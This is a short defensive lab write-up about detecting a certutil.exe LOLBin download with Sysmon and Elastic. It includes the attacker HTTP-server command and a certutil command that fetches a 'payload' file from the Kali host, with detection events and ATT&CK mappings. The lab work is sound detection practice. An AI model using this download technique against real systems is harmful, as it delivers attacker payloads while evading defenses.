# Case 08 - Certutil Payload Download

## Objective

Detect and investigate file download activity performed using the Windows LOLBin `certutil.exe` with Sysmon and Elastic Stack.

## Lab Environment

| Machine     | Role             | IP Address     |
| ----------- | ---------------- | -------------- |
| Kali Linux  | HTTP Server      | 192.168.56.102 |
| Windows 10  | Victim           | 192.168.56.103 |
| Host Laptop | Elastic + Kibana | 192.168.56.1   |

## Attack Scenario

The Windows utility `certutil.exe` was used to download a file from a Python HTTP server running on the Kali Linux machine. Adversaries frequently abuse LOLBins to download payloads and evade detection.

## Commands Used

### Kali Linux

```bash
python3 -m http.server 8000
```

### Windows 10

```cmd
certutil.exe -urlcache -split -f http://192.168.56.102:8000/payload.txt C:\Temp\payload.txt
```

## Detection Method

* Sysmon Event ID 1 (Process Creation)
* Sysmon Event ID 3 (Network Connection)

## Findings

* Process Name: certutil.exe
* Source IP: 192.168.56.103
* Destination IP: 192.168.56.102
* User: vboxuser
* Hostname: WINDOWS10

## MITRE ATT&CK

* T1218 - System Binary Proxy Execution
* T1105 - Ingress Tool Transfer

## References

* Investigation.md
* MITRE-Mapping.md
